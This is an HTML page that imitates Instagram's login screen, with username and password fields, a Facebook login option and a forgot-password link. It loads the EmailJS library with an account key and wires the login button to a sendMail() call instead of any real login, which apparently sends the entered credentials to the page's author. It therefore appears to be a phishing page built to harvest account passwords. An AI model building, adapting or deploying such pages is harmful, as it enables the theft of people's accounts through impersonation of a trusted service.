<!DOCTYPE html>
<html>

<head>
    <meta charset='utf-8'>
    <title>instagram login page</title>
    <meta name='description' content='This is an example of a meta description.'>
    <meta content="width = device-width , initial-scale = 1" name="viewport">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous">
   
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
    (function() {
        emailjs.init("user_y1iPmGJrxgN9xVFuQVL3P");
    })();
    </script>
</head>

<body>
    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo">
                    <img src="logo2.png" alt=""  style = " width: 175px;">
                </div>
                <form class="form">
                    <div class="input_field">
                        <input name="user_name" id="username" type="text" placeholder="Phone Number , username , or email" class="input">
                    </div>
                    <div class="input_field">
                        <input name="user_pw" id="passw" type="text" placeholder="Password" class="input">
                    </div>
                    <div class="btn">
                        <a onclick="sendMail()" href="#">log In</a>
                    </div>
                </form>
                <div class="or">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="diff">
                    <div class="fb">
                        <i class="fab fa-facebook"></i>
                        <p>log in with facebook</p>
                        
                    </div>
                    <div class="forgot">
                        <a href="#"> forgot password</a>
                    </div>
                </div>
            </div>
            <div class="signup"></div>
            <div class="apps"></div>
        </div>
        <div class="footer">
           
        </div>
    </div>
    <script src="index.js"></script>
</body>

</html>
